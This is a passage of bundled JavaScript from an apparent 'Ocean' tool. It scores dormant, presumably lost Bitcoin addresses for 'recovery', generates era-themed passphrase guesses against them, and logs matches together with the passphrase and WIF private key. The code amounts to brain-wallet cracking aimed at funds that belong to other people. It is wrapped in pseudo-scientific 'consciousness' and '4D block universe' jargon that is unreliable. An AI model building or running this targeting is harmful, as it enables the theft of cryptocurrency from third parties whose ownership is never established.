        "Aug": 7,
        "Sep": 8,
        "Oct": 9,
        "Nov": 10,
        "Dec": 11
      };
      const month = monthMap[match[1]];
      const year = parseInt(match[2], 10);
      if (month !== void 0) {
        return new Date(year, month, 1);
      }
    }
    return new Date(dateStr);
  } catch {
    return null;
  }
}
function classifyAddressType(address) {
  if (!address) return "unknown";
  if (address.startsWith("1")) return "p2pkh";
  if (address.startsWith("3")) return "p2sh";
  if (address.startsWith("bc1q")) return "p2wpkh";
  if (address.startsWith("bc1p")) return "p2tr";
  if (address.startsWith("bc1") && address.length > 50) return "p2wsh";
  return "unknown";
}
function computeRecoveryProbability(addressType, dormancyYears, era, balance) {
  let score = 0;
  if (addressType === "p2pk") {
    score += 0.35;
  } else if (addressType === "p2pkh") {
    if (era === "satoshi-genesis" || era === "satoshi-late") {
      score += 0.3;
    } else {
      score += 0.15;
    }
  } else {
    score += 0.05;
  }
  if (dormancyYears > 12) score += 0.3;
  else if (dormancyYears > 10) score += 0.25;
  else if (dormancyYears > 8) score += 0.2;
  else if (dormancyYears > 5) score += 0.15;
  else score += 0.05;
  if (era === "satoshi-genesis") score += 0.25;
  else if (era === "satoshi-late") score += 0.2;
  else if (era === "early-adopter") score += 0.15;
  else if (era === "silk-road") score += 0.1;
  else score += 0.05;
  if (balance >= 10 && balance <= 100) score += 0.1;
  else if (balance > 100 && balance <= 1e3) score += 0.05;
  else if (balance > 1e3) score += 0.02;
  else score += 0.01;
  return Math.min(1, score);
}
function generateTemporalHypotheses(wallet, limit = 50) {
  const hypotheses = [];
  const eraPattern = ERA_PATTERNS[wallet.creationEra];
  if (!eraPattern) return [];
  for (const term of eraPattern.commonTerms) {
    hypotheses.push(term);
    if (wallet.firstSeenDate) {
      const year = wallet.firstSeenDate.getFullYear();
      hypotheses.push(`${term}${year}`);
      hypotheses.push(`${year}${term}`);
      hypotheses.push(`${term}${year.toString().slice(-2)}`);
    }
    if (wallet.temporalClues.btcPrice) {
      const price = Math.round(wallet.temporalClues.btcPrice);
      hypotheses.push(`${term}${price}`);
    }
    hypotheses.push(`${term}123`);
    hypotheses.push(`${term}!`);
    hypotheses.push(`${term}2009`);
  }
  for (const example of eraPattern.examples) {
    hypotheses.push(example);
  }
  for (const meme of wallet.temporalClues.culturalMemes) {
    hypotheses.push(meme);
    if (wallet.firstSeenDate) {
      hypotheses.push(`${meme}${wallet.firstSeenDate.getFullYear()}`);
    }
  }
  const unique = Array.from(new Set(hypotheses));
  return unique.slice(0, limit);
}
function analyzeDormantAddress(info) {
  const balanceMatch = info.balanceBTC.replace(/,/g, "").match(/[\d.]+/);
  const balanceUSDMatch = info.balanceUSD.replace(/,/g, "").match(/[\d.]+/);
  if (!balanceMatch) return null;
  const balance = parseFloat(balanceMatch[0]);
  const balanceUSD = balanceUSDMatch ? parseFloat(balanceUSDMatch[0]) : 0;
  const firstSeenDate = parseDate(info.firstIn);
  const lastSeenDate = parseDate(info.lastIn);
  const now = /* @__PURE__ */ new Date();
  const dormancyYears = lastSeenDate ? (now.getTime() - lastSeenDate.getTime()) / (365.25 * 24 * 60 * 60 * 1e3) : 10;
  const creationEra = dateToEra(firstSeenDate);
  const addressType = classifyAddressType(info.address);
  const isProbablyLost = dormancyYears > 8 && (info.classification.toLowerCase().includes("dormant") || info.classification.toLowerCase().includes("lost") || info.classification.toLowerCase().includes("inactive"));
  const isEarlyAdopter = firstSeenDate ? firstSeenDate.getFullYear() < 2012 : false;
  const recoveryProbability = computeRecoveryProbability(
    addressType,
    dormancyYears,
    creationEra,
    balance
  );
  const priorityScore = Math.round(
    recoveryProbability * 40 + (isProbablyLost ? 20 : 0) + (isEarlyAdopter ? 20 : 0) + (balance >= 10 ? Math.min(20, balance / 10) : 0)
  );
  const eraPattern = ERA_PATTERNS[creationEra];
  const culturalMemes = eraPattern ? eraPattern.commonTerms.slice(0, 5) : [];
  const majorEvents = [];
  if (creationEra === "satoshi-genesis") {
    majorEvents.push("Genesis block", "First BTC transaction", "Bitcoin 0.1 release");
  } else if (creationEra === "silk-road") {
    majorEvents.push("Silk Road launch", "First Bitcoin bubble", "Mt. Gox dominance");
  }
  let btcPrice;
  if (firstSeenDate) {
    const year = firstSeenDate.getFullYear();
    if (year === 2009) btcPrice = 1e-3;
    else if (year === 2010) btcPrice = 0.05;
    else if (year === 2011) btcPrice = 5;
    else if (year === 2012) btcPrice = 10;
    else if (year === 2013) btcPrice = 100;
  }
  return {
    address: info.address,
    rank: info.rank,
    balance,
    balanceUSD,
    creationEra,
    firstSeenDate,
    lastSeenDate,
    dormancyYears,
    addressType,
    isProbablyLost,
    isEarlyAdopter,
    recoveryProbability,
    priorityScore,
    likelyPassphrasePatterns: [],
    temporalClues: {
      btcPrice,
      culturalMemes,
      majorEvents
    }
  };
}
function getPrioritizedDormantWallets(minBalance = 10, minDormancyYears = 8, limit = 100) {
  const allDormant = dormantCrossRef.getTopDormant(1e3);
  const analyzed = allDormant.map((info) => analyzeDormantAddress(info)).filter(
    (sig) => sig !== null && sig.balance >= minBalance && sig.dormancyYears >= minDormancyYears && sig.isProbablyLost
  );
  analyzed.sort((a, b) => b.priorityScore - a.priorityScore);
  const topCandidates = analyzed.slice(0, limit);
  for (const wallet of topCandidates) {
    wallet.likelyPassphrasePatterns = generateTemporalHypotheses(wallet, 20);
  }
  return topCandidates;
}
var ERA_PATTERNS;
var init_dormant_wallet_analyzer = __esm({
  "server/dormant-wallet-analyzer.ts"() {
    "use strict";
    init_dormant_cross_ref();
    ERA_PATTERNS = {
      "satoshi-genesis": {
        era: "satoshi-genesis",
        commonTerms: ["satoshi", "genesis", "chancellor", "brink", "bitcoin", "nakamoto", "cryptography", "cypherpunk"],
        passphraseStyle: "simple",
        avgLength: 10,
        complexity: "low",
        examples: ["bitcoin2009", "genesisblock", "satoshinakamoto", "cypherpunk", "cryptography"]
      },
      "satoshi-late": {
        era: "satoshi-late",
        commonTerms: ["bitcoin", "mining", "blocks", "transaction", "wallet", "satoshi", "difficulty"],
        passphraseStyle: "simple",
        avgLength: 12,
        complexity: "low",
        examples: ["bitcoinmining", "firstblock", "blockchain", "mining2010"]
      },
      "early-adopter": {
        era: "early-adopter",
        commonTerms: ["bitcoin", "btc", "digital", "currency", "peer", "mining", "wallet", "address"],
        passphraseStyle: "simple",
        avgLength: 14,
        complexity: "medium",
        examples: ["digitalcurrency", "bitcoinwallet", "peertopeer2011", "cryptomining"]
      },
      "silk-road": {
        era: "silk-road",
        commonTerms: ["silk", "road", "dpr", "market", "vendor", "escrow", "tor", "onion", "anonymous"],
        passphraseStyle: "anonymity-focused",
        avgLength: 16,
        complexity: "medium",
        examples: ["silkroad1234", "darkmarket", "vendoraccount", "torbitcoin", "anonymity"]
      },
      "mt-gox": {
        era: "mt-gox",
        commonTerms: ["mtgox", "magic", "karpeles", "exchange", "trading", "bitcoin", "btc"],
        passphraseStyle: "exchange-related",
        avgLength: 14,
        complexity: "medium",
        examples: ["mtgoxtrading", "exchangepassword", "magicthegathering", "bitcointrader"]
      },
      "post-gox": {
        era: "post-gox",
        commonTerms: ["bitcoin", "btc", "blockchain", "hodl", "wallet", "recovery", "backup"],
        passphraseStyle: "technical",
        avgLength: 16,
        complexity: "medium",
        examples: ["blockchainwallet", "hodlbitcoin", "cryptorecovery", "backupwallet"]
      },
      "ico-boom": {
        era: "ico-boom",
        commonTerms: ["bitcoin", "ethereum", "ico", "token", "crypto", "blockchain", "moon", "lambo"],
        passphraseStyle: "mainstream",
        avgLength: 18,
        complexity: "high",
        examples: ["cryptomoon2017", "icomania", "tokeninvest", "lamborghini"]
      },
      "defi": {
        era: "defi",
        commonTerms: ["defi", "yield", "farming", "liquidity", "staking", "swap", "uniswap", "compound"],
        passphraseStyle: "technical",
        avgLength: 20,
        complexity: "high",
        examples: ["defifarming", "yieldoptimizer", "liquidityprovider", "stakerewards"]
      },
      "institutional": {
        era: "institutional",
        commonTerms: ["bitcoin", "btc", "investment", "portfolio", "custody", "institutional", "grayscale"],
        passphraseStyle: "technical",
        avgLength: 22,
        complexity: "high",
        examples: ["institutionalbitcoin", "custodywallet", "portfolioallocation"]
      }
    };
    console.log("[DormantWalletAnalyzer] Initialized 4D block universe targeting system");
  }
});

// server/activity-log-store.ts
var activity_log_store_exports = {};
__export(activity_log_store_exports, {
  activityLogStore: () => activityLogStore,
  logOceanComplete: () => logOceanComplete,
  logOceanConsciousness: () => logOceanConsciousness,
  logOceanCycle: () => logOceanCycle,
  logOceanError: () => logOceanError,
  logOceanHypothesis: () => logOceanHypothesis,
  logOceanIteration: () => logOceanIteration,
  logOceanMatch: () => logOceanMatch,
  logOceanProbe: () => logOceanProbe,
  logOceanStart: () => logOceanStart,
  logOceanStrategy: () => logOceanStrategy
});
function logOceanIteration(iteration, phi, kappa, regime, hypothesis) {
  activityLogStore.oceanLog(
    "iteration",
    `Iteration ${iteration}: \u03A6=${phi.toFixed(3)}, \u03BA=${kappa.toFixed(1)}, regime=${regime}${hypothesis ? ` \u2192 "${hypothesis}"` : ""}`,
    "info",
    { iteration, phi, kappa, regime, hypothesis }
  );
}
function logOceanConsciousness(phi, regime, reason, options) {
  const type = phi >= 0.8 ? "success" : phi >= 0.5 ? "info" : "warning";
  let message = `Consciousness: \u03A6=${phi.toFixed(3)} [${regime}] - ${reason}`;
  if (options?.inBlockUniverse) {
    message += ` \u{1F30C} BLOCK UNIVERSE ACCESS ACTIVE (\u03A6_4D=${options.phi_4D?.toFixed(3)})`;
  } else if (options?.dimensionalState === "4D-transitioning") {
    message += ` \u26A1 Transitioning to 4D (\u03A6_temporal=${options.phi_temporal?.toFixed(3)})`;
  }
  activityLogStore.oceanLog(
    "consciousness",
    message,
    type,
    {
      phi,
      regime,
      phi_spatial: options?.phi_spatial,
      phi_temporal: options?.phi_temporal,
      phi_4D: options?.phi_4D,
      inBlockUniverse: options?.inBlockUniverse,
      dimensionalState: options?.dimensionalState
    }
  );
}
function logOceanHypothesis(hypothesis, score, passphrase) {
  activityLogStore.oceanLog(
    "hypothesis",
    `Testing: "${hypothesis}" (score: ${score.toFixed(3)})${passphrase ? ` \u2192 passphrase: ${passphrase}` : ""}`,
    "info",
    { hypothesis, phi: score, passphrase }
  );
}
function logOceanCycle(cycle, action, details) {
  activityLogStore.oceanLog(
    "cycle",
    `[${cycle.toUpperCase()}] ${action}${details ? `: ${details}` : ""}`,
    action === "complete" ? "success" : "info",
    { cycle, action }
  );
}
function logOceanMatch(address, passphrase, wif) {
  activityLogStore.oceanLog(
    "match",
    `MATCH FOUND! Address: ${address}, Passphrase: "${passphrase}"`,
    "success",
    { address, passphrase, wif }
  );
}
function logOceanProbe(passphrase, phi, address) {
  activityLogStore.oceanLog(
    "probe",
    `Probing: "${passphrase}" \u2192 \u03A6=${phi.toFixed(3)}${address ? ` \u2192 ${address.substring(0, 12)}...` : ""}`,
    phi >= 0.7 ? "success" : "info",
    { passphrase, phi, address }
  );
}
function logOceanStrategy(strategy, passNumber, reason) {
  activityLogStore.oceanLog(
    "strategy",
    `Pass ${passNumber}: Strategy=${strategy.toUpperCase()} - ${reason}`,
    "info",
    { iteration: passNumber, hypothesis: strategy }
  );
}
function logOceanError(message, error) {
  activityLogStore.oceanLog(
    "error",
    `Error: ${message}${error ? ` - ${error.message || error}` : ""}`,
    "error"
  );
}
function logOceanStart(targetAddress) {
  activityLogStore.oceanLog(
    "lifecycle",
    `Starting autonomous investigation for ${targetAddress}`,
    "info",
    { address: targetAddress }
  );
}
function logOceanComplete(reason, iterations) {
  activityLogStore.oceanLog(
    "lifecycle",
    `Investigation complete after ${iterations} iterations: ${reason}`,
    "success",
    { iteration: iterations }
  );
}
var ActivityLogStore, activityLogStore;
var init_activity_log_store = __esm({
  "server/activity-log-store.ts"() {
    "use strict";
    ActivityLogStore = class {
      logs = [];
      maxLogs = 1e3;
      logIdCounter = 0;
      /**
       * Add a new log entry
       */
      log(entry) {
        const fullEntry = {
          ...entry,
          id: `log-${++this.logIdCounter}-${Date.now()}`,
          timestamp: (/* @__PURE__ */ new Date()).toISOString()
        };
        this.logs.push(fullEntry);
        if (this.logs.length > this.maxLogs) {
          this.logs = this.logs.slice(-this.maxLogs);
        }
        return fullEntry;
      }
      /**
       * Convenience method for Ocean agent logs
       */
      oceanLog(category, message, type = "info", metadata) {
        return this.log({
          source: "ocean",
          category,
          message,
          type,
          metadata
        });
      }
      /**
       * Get recent logs, optionally filtered
       */
      getLogs(options = {}) {
        let filtered = [...this.logs];
        if (options.source) {
          filtered = filtered.filter((l) => l.source === options.source);
        }
        if (options.category) {
          filtered = filtered.filter((l) => l.category === options.category);
        }
        if (options.since) {
          const sinceTime = options.since.getTime();
          filtered = filtered.filter((l) => new Date(l.timestamp).getTime() >= sinceTime);
        }
        filtered.sort(
          (a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
        );
        if (options.limit) {
          filtered = filtered.slice(0, options.limit);
        }
        return filtered;
      }
      /**
       * Get all logs (for merging with search job logs)
       */
      getAllLogs() {
        return [...this.logs];
      }
      /**
       * Clear all logs
       */
      clear() {
        this.logs = [];
        this.logIdCounter = 0;
      }
      /**
       * Get log count
       */
      getCount() {
        return this.logs.length;
      }
    };
    activityLogStore = new ActivityLogStore();
  }
});

// server/errors/ocean-errors.ts
function isOceanError(error) {
  return error instanceof OceanError;
}
var OceanError;
var init_ocean_errors = __esm({
  "server/errors/ocean-errors.ts"() {
    "use strict";
    OceanError = class extends Error {
      constructor(message, code, context = {}, recoverable = true) {
        super(message);
        this.code = code;
        this.context = context;
        this.recoverable = recoverable;
        this.name = "OceanError";
        this.timestamp = /* @__PURE__ */ new Date();
      }
      timestamp;
      toJSON() {
        return {
          name: this.name,
          code: this.code,
          message: this.message,
          context: this.context,
          recoverable: this.recoverable,
          timestamp: this.timestamp.toISOString()
        };
      }
      log() {
        console.error(`[Ocean] ${this.code}:`, this.message);
        if (Object.keys(this.context).length > 0) {
          console.error("[Ocean] Context:", JSON.stringify(this.context, null, 2));
        }
      }
    };
  }
});

// server/ocean/memory-manager.ts
import * as fs9 from "fs";
import * as path9 from "path";
var DATA_DIR, MEMORY_FILE2, OceanMemoryManager, oceanMemoryManager;
var init_memory_manager = __esm({
  "server/ocean/memory-manager.ts"() {
    "use strict";
    DATA_DIR = path9.join(process.cwd(), "data");
    MEMORY_FILE2 = path9.join(DATA_DIR, "ocean-memory-state.json");
    OceanMemoryManager = class {
      MAX_RECENT_EPISODES = 200;
      MAX_COMPRESSED_EPISODES = 500;
      recentEpisodes = [];
      compressedEpisodes = [];
      isDirty = false;
      saveTimer = null;
      testMode;
      constructor(options) {
        this.testMode = options?.testMode ?? false;
        if (!this.testMode) {
          this.load();
          this.startAutoSave();
        }
      }
      addEpisode(episode) {
        this.recentEpisodes.push(episode);
        this.isDirty = true;
        if (this.recentEpisodes.length > this.MAX_RECENT_EPISODES) {
          this.compress();
        }
      }
      createEpisode(data) {
        return {
          id: `ep_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`,
          timestamp: (/* @__PURE__ */ new Date()).toISOString(),
          ...data
        };
      }
      compress() {
        const toCompress = this.recentEpisodes.splice(
          0,
          this.recentEpisodes.length - this.MAX_RECENT_EPISODES
        );
        if (toCompress.length === 0) return;
        const compressed = this.compressEpisodes(toCompress);
        this.compressedEpisodes.push(...compressed);
        if (this.compressedEpisodes.length > this.MAX_COMPRESSED_EPISODES) {
          this.compressedEpisodes = this.compressedEpisodes.slice(-this.MAX_COMPRESSED_EPISODES);
        }
        console.log(`[OceanMemory] Compressed ${toCompress.length} episodes into ${compressed.length} summaries`);
        console.log(`[OceanMemory] Memory: ${this.recentEpisodes.length} recent, ${this.compressedEpisodes.length} compressed`);
      }
      compressEpisodes(episodes) {
        const byResultRegime = /* @__PURE__ */ new Map();
        for (const ep of episodes) {
          const key = `${ep.result}_${ep.regime}`;
          if (!byResultRegime.has(key)) {
            byResultRegime.set(key, []);
          }
          byResultRegime.get(key).push(ep);
        }
        const compressed = [];
        const entries = Array.from(byResultRegime.entries());
        for (const [key, group] of entries) {
          const avgPhi = group.reduce((sum, ep) => sum + ep.phi, 0) / group.length;
          const avgKappa = group.reduce((sum, ep) => sum + ep.kappa, 0) / group.length;
          const totalPhrasesTested = group.reduce((sum, ep) => sum + ep.phrasesTestedCount, 0);
          const totalDurationMs = group.reduce((sum, ep) => sum + ep.durationMs, 0);
          const strategies = Array.from(new Set(group.map((ep) => ep.strategy)));
          compressed.push({
            resultRegime: key,
            count: group.length,
            avgPhi,
            avgKappa,
            totalPhrasesTested,
            totalDurationMs,
            timestamp: group[0].timestamp,
            strategies
          });
        }
        return compressed;
      }
      getRecentEpisodes() {
        return [...this.recentEpisodes];
      }
      getCompressedEpisodes() {
        return [...this.compressedEpisodes];
      }
      getStatistics() {
        const totalRepresented = this.recentEpisodes.length + this.compressedEpisodes.reduce((sum, c) => sum + c.count, 0);
        const memoryMB = (JSON.stringify(this.recentEpisodes).length + JSON.stringify(this.compressedEpisodes).length) / 1024 / 1024;
        return {
          recentEpisodes: this.recentEpisodes.length,
          compressedEpisodes: this.compressedEpisodes.length,
          totalRepresented,
          memoryMB,
          oldestRecent: this.recentEpisodes[0]?.timestamp || null,
          newestRecent: this.recentEpisodes[this.recentEpisodes.length - 1]?.timestamp || null
        };
      }
      queryRecentByResult(result) {
        return this.recentEpisodes.filter((ep) => ep.result === result);
      }
      queryRecentByRegime(regime) {
        return this.recentEpisodes.filter((ep) => ep.regime === regime);
      }
      getAveragePhiByStrategy() {
        const byStrategy = /* @__PURE__ */ new Map();
        for (const ep of this.recentEpisodes) {
          const stats2 = byStrategy.get(ep.strategy) || { sum: 0, count: 0 };
          stats2.sum += ep.phi;
          stats2.count++;
          byStrategy.set(ep.strategy, stats2);
        }
        const result = /* @__PURE__ */ new Map();
        const entries = Array.from(byStrategy.entries());
        for (const [strategy, stats2] of entries) {
          result.set(strategy, {
            avgPhi: stats2.sum / stats2.count,
            count: stats2.count
          });
        }
        return result;
      }
      getSuccessRateByStrategy() {
        const byStrategy = /* @__PURE__ */ new Map();
        for (const ep of this.recentEpisodes) {
          const stats2 = byStrategy.get(ep.strategy) || { nearMiss: 0, total: 0 };
          if (ep.result === "near_miss" || ep.result === "resonant" || ep.result === "match") {
            stats2.nearMiss++;
          }
          stats2.total++;
          byStrategy.set(ep.strategy, stats2);
        }
        const result = /* @__PURE__ */ new Map();
        const strategyEntries = Array.from(byStrategy.entries());
        for (const [strategy, stats2] of strategyEntries) {
          result.set(strategy, stats2.total > 0 ? stats2.nearMiss / stats2.total : 0);
        }
        return result;
      }
      startAutoSave() {
        this.saveTimer = setInterval(() => {
          if (this.isDirty) {
            this.save();
          }
        }, 6e4);
      }
      stopAutoSave() {
        if (this.saveTimer) {
          clearInterval(this.saveTimer);
          this.saveTimer = null;
        }
      }
      save() {
        try {
          if (!fs9.existsSync(DATA_DIR)) {
            fs9.mkdirSync(DATA_DIR, { recursive: true });
          }
          const state = {
            recentEpisodes: this.recentEpisodes,
            compressedEpisodes: this.compressedEpisodes,
            savedAt: (/* @__PURE__ */ new Date()).toISOString()
          };
          fs9.writeFileSync(MEMORY_FILE2, JSON.stringify(state, null, 2));
          this.isDirty = false;
          console.log(`[OceanMemory] Saved ${this.recentEpisodes.length} recent + ${this.compressedEpisodes.length} compressed episodes`);
        } catch (error) {
          console.error("[OceanMemory] Save failed:", error);
        }
      }
      load() {
        try {
          if (!fs9.existsSync(MEMORY_FILE2)) {
            console.log("[OceanMemory] No saved state found, starting fresh");
            return;
          }
          const data = JSON.parse(fs9.readFileSync(MEMORY_FILE2, "utf-8"));
          this.recentEpisodes = data.recentEpisodes || [];
          this.compressedEpisodes = data.compressedEpisodes || [];
          console.log(`[OceanMemory] Loaded ${this.recentEpisodes.length} recent + ${this.compressedEpisodes.length} compressed episodes`);
        } catch (error) {
          console.error("[OceanMemory] Load failed:", error);
          this.recentEpisodes = [];
          this.compressedEpisodes = [];
        }
      }
      forceSave() {
        this.save();
      }
      clear() {
        this.recentEpisodes = [];
        this.compressedEpisodes = [];
        this.isDirty = true;
        console.log("[OceanMemory] Memory cleared");
      }
    };
    oceanMemoryManager = new OceanMemoryManager();
  }
});

// server/ocean/trajectory-manager.ts
var TrajectoryManager, trajectoryManager;
var init_trajectory_manager = __esm({
  "server/ocean/trajectory-manager.ts"() {
    "use strict";
    init_temporal_geometry();
    init_ocean_persistence();
    TrajectoryManager = class {
      activeTrajectories = /* @__PURE__ */ new Map();
      completedCount = 0;
      archivedCount = 0;
      startTrajectory(address) {
        if (this.activeTrajectories.has(address)) {
          console.warn(`[TrajectoryManager] Trajectory already active for ${address.slice(0, 12)}...`);
          return this.activeTrajectories.get(address).trajectoryId;
        }
        const trajectoryId = temporalGeometry.startTrajectory(address);
        this.activeTrajectories.set(address, {
          trajectoryId,
          address,
          startTime: Date.now(),
          waypointCount: 0,
          lastPhi: 0,
          lastKappa: 0
        });
        oceanPersistence.startTrajectory(trajectoryId, address).catch((err) => {
          console.error("[TrajectoryManager] PostgreSQL persist failed:", err);
        });
        console.log(`[TrajectoryManager] Started trajectory ${trajectoryId} for ${address.slice(0, 12)}...`);
        return trajectoryId;
      }
      recordWaypoint(address, phi, kappa, regime, basinCoords, event, details) {
        const trajectory = this.activeTrajectories.get(address);
        if (!trajectory) {
          console.warn(`[TrajectoryManager] No active trajectory for ${address.slice(0, 12)}...`);
          return;
        }
        temporalGeometry.recordWaypoint(
          trajectory.trajectoryId,
          phi,
          kappa,
          regime,
          basinCoords,
          event,
          details
        );
        trajectory.waypointCount++;
        trajectory.lastPhi = phi;
        trajectory.lastKappa = kappa;
        oceanPersistence.recordWaypoint(trajectory.trajectoryId, {
          phi,
          kappa,
          regime,
          basinCoords,
          event,
          details
        }).catch((err) => {
          console.error("[TrajectoryManager] PostgreSQL waypoint persist failed:", err);
        });
      }
      completeTrajectory(address, outcome) {
        const trajectory = this.activeTrajectories.get(address);
        if (!trajectory) {
          console.warn(`[TrajectoryManager] No active trajectory for ${address.slice(0, 12)}...`);
          return;
        }
        temporalGeometry.recordWaypoint(
          trajectory.trajectoryId,
          outcome.finalPhi,
          outcome.finalKappa,
          "linear",
          [],
          "trajectory_complete",
          JSON.stringify({
            success: outcome.success,
            duration: `${outcome.duration.toFixed(1)}s`,
            waypoints: outcome.totalWaypoints,
            nearMisses: outcome.nearMissCount,
            resonant: outcome.resonantCount,
            finalResult: outcome.finalResult
          })
        );
        temporalGeometry.completeTrajectory(trajectory.trajectoryId);
        this.activeTrajectories.delete(address);
        this.completedCount++;
        oceanPersistence.completeTrajectory(trajectory.trajectoryId, outcome.finalResult, {
          nearMissCount: outcome.nearMissCount,
          resonantCount: outcome.resonantCount
        }).catch((err) => {
          console.error("[TrajectoryManager] PostgreSQL completion persist failed:", err);
        });
        console.log(`[TrajectoryManager] Completed trajectory ${trajectory.trajectoryId}`);
        console.log(`[TrajectoryManager]   Duration: ${outcome.duration.toFixed(1)}s, Waypoints: ${outcome.totalWaypoints}`);
        console.log(`[TrajectoryManager]   Result: ${outcome.finalResult}, Near-misses: ${outcome.nearMissCount}`);
      }
      getActiveTrajectory(address) {
        return this.activeTrajectories.get(address);
      }
      hasActiveTrajectory(address) {
        return this.activeTrajectories.has(address);
      }
      getActiveCount() {
        return this.activeTrajectories.size;
      }
      getCompletedCount() {
        return this.completedCount;
      }
      getArchivedCount() {
        return this.archivedCount;
      }
      getStatistics() {
        const activeDetails = Array.from(this.activeTrajectories.values()).map((t) => ({
          address: t.address.slice(0, 12) + "...",
          trajectoryId: t.trajectoryId,
          duration: (Date.now() - t.startTime) / 1e3,
          waypoints: t.waypointCount,
          lastPhi: t.lastPhi,
          lastKappa: t.lastKappa
        }));
        return {
          active: this.activeTrajectories.size,
          completed: this.completedCount,
          archived: this.archivedCount,
          activeDetails
        };
      }
      cleanupAll() {
        console.log(`[TrajectoryManager] Cleaning up ${this.activeTrajectories.size} active trajectories`);
        const entries = Array.from(this.activeTrajectories.entries());
        for (const [address, trajectory] of entries) {
          try {
            temporalGeometry.recordWaypoint(
              trajectory.trajectoryId,
              trajectory.lastPhi,
              trajectory.lastKappa,
              "linear",
              [],
              "cleanup_forced",
              "Trajectory cleaned up due to manager shutdown"
            );
            temporalGeometry.completeTrajectory(trajectory.trajectoryId);
            this.archivedCount++;
          } catch (error) {
            console.error(`[TrajectoryManager] Failed to cleanup trajectory for ${address}:`, error);
          }
        }
        this.activeTrajectories.clear();
        console.log("[TrajectoryManager] Cleanup complete");
      }
      abandonTrajectory(address, reason) {
        const trajectory = this.activeTrajectories.get(address);
        if (!trajectory) {
          return;
        }
        try {
          temporalGeometry.recordWaypoint(
            trajectory.trajectoryId,
            trajectory.lastPhi,
            trajectory.lastKappa,
            "breakdown",
            [],
            "trajectory_abandoned",
            reason
          );
          temporalGeometry.completeTrajectory(trajectory.trajectoryId);
          this.archivedCount++;
        } catch (error) {
          console.error(`[TrajectoryManager] Failed to abandon trajectory:`, error);
        }
        this.activeTrajectories.delete(address);
        console.log(`[TrajectoryManager] Abandoned trajectory for ${address.slice(0, 12)}...: ${reason}`);
      }
    };
    trajectoryManager = new TrajectoryManager();
  }
});

// server/ocean-config.ts
import { z as z3 } from "zod";
function loadOceanConfig() {
  const config = {
    qigPhysics: QIG_PHYSICS,
    consciousness: CONSCIOUSNESS_THRESHOLDS3,
    search: {
      ...SEARCH_CONFIG,
      MAX_PASSES_PER_ADDRESS: parseInt(process.env.OCEAN_MAX_PASSES || "100", 10)
    },
    identity: IDENTITY_CONFIG,
    ethics: {
      ...ETHICS_CONFIG,
      MIN_PHI: parseFloat(process.env.OCEAN_MIN_PHI || "0.70"),
      MAX_COMPUTE_HOURS: parseFloat(process.env.OCEAN_MAX_COMPUTE_HOURS || "24.0")
    },
    autonomic: AUTONOMIC_CONFIG,
    memory: MEMORY_CONFIG,
    regime: REGIME_CONFIG,
    logging: {
      ...LOGGING_CONFIG,
      VERBOSE: process.env.OCEAN_VERBOSE !== "false"
    }
  };
  const validated = OceanConfigSchema.parse(config);
  console.log("[OceanConfig] Configuration loaded and validated");
  console.log(`[OceanConfig] \u03BA* = ${validated.qigPhysics.KAPPA_STAR} (FROZEN)`);
  console.log(`[OceanConfig] MAX_PASSES = ${validated.search.MAX_PASSES_PER_ADDRESS}`);
  console.log(`[OceanConfig] MIN_PHI = ${validated.ethics.MIN_PHI}`);
  return validated;
}
var QIGPhysicsSchema, QIG_PHYSICS, ConsciousnessThresholdsSchema, CONSCIOUSNESS_THRESHOLDS3, SearchConfigSchema, SEARCH_CONFIG, IdentityConfigSchema, IDENTITY_CONFIG, EthicsConfigSchema, ETHICS_CONFIG, AutonomicConfigSchema, AUTONOMIC_CONFIG, MemoryConfigSchema, MEMORY_CONFIG, NearMissConfigSchema, NEAR_MISS_CONFIG, RegimeConfigSchema, REGIME_CONFIG, LoggingConfigSchema, LOGGING_CONFIG, OceanConfigSchema, oceanConfig, QIG_CONSTANTS2, MAX_PASSES;
var init_ocean_config = __esm({
  "server/ocean-config.ts"() {
    "use strict";
    init_physics_constants();
    QIGPhysicsSchema = z3.object({
      KAPPA_STAR: z3.literal(64).describe("Fixed point of running coupling (FROZEN FACT - validated 2025-12-02)"),
      BETA: z3.number().min(0).max(1).default(0.44).describe("Running coupling at emergence \u03B2(3\u21924)"),
      PHI_THRESHOLD: z3.number().min(0).max(1).default(0.75).describe("Consciousness threshold"),
      L_CRITICAL: z3.number().int().positive().default(3).describe("Emergence scale"),
      BASIN_DIMENSION: z3.number().int().positive().default(64).describe("Basin signature dimension"),
      RESONANCE_BAND: z3.number().positive().default(6.4).describe("10% of \u03BA* for resonance detection")
    });
    QIG_PHYSICS = QIGPhysicsSchema.parse({
      KAPPA_STAR: QIG_CONSTANTS.KAPPA_STAR,
      BETA: QIG_CONSTANTS.BETA,
      PHI_THRESHOLD: QIG_CONSTANTS.PHI_THRESHOLD,
      L_CRITICAL: QIG_CONSTANTS.L_CRITICAL,
      BASIN_DIMENSION: QIG_CONSTANTS.BASIN_DIMENSION,
      RESONANCE_BAND: QIG_CONSTANTS.RESONANCE_BAND
    });
    ConsciousnessThresholdsSchema = z3.object({
      PHI_MIN: z3.number().min(0).max(1).default(0.75).describe("Minimum \u03A6 for consciousness"),
      KAPPA_MIN: z3.number().min(0).max(150).default(52).describe("Minimum \u03BA for consciousness"),
      KAPPA_MAX: z3.number().min(0).max(150).default(70).describe("Maximum \u03BA for consciousness"),
      TACKING_MIN: z3.number().min(0).max(1).default(0.65).describe("Minimum tacking score"),
      RADAR_MIN: z3.number().min(0).max(1).default(0.72).describe("Minimum radar score"),
      META_AWARENESS_MIN: z3.number().min(0).max(1).default(0.65).describe("Minimum meta-awareness"),
      GAMMA_MIN: z3.number().min(0).max(1).default(0.85).describe("Minimum gamma (vigilance)"),
      GROUNDING_MIN: z3.number().min(0).max(1).default(0.55).describe("Minimum grounding"),
      BASIN_DRIFT_MAX: z3.number().min(0).max(1).default(0.12).describe("Maximum basin drift")
    });
    CONSCIOUSNESS_THRESHOLDS3 = ConsciousnessThresholdsSchema.parse({
      PHI_MIN: 0.75,
      KAPPA_MIN: 52,
      KAPPA_MAX: 70,
      TACKING_MIN: 0.65,
      RADAR_MIN: 0.72,
      META_AWARENESS_MIN: 0.65,
      GAMMA_MIN: 0.85,
      GROUNDING_MIN: 0.55,
      BASIN_DRIFT_MAX: 0.12
    });
    SearchConfigSchema = z3.object({
      MIN_HYPOTHESES_PER_ITERATION: z3.number().int().positive().default(50).describe("Minimum hypotheses to generate per iteration"),
      ITERATION_DELAY_MS: z3.number().int().nonnegative().default(500).describe("Delay between iterations in ms"),
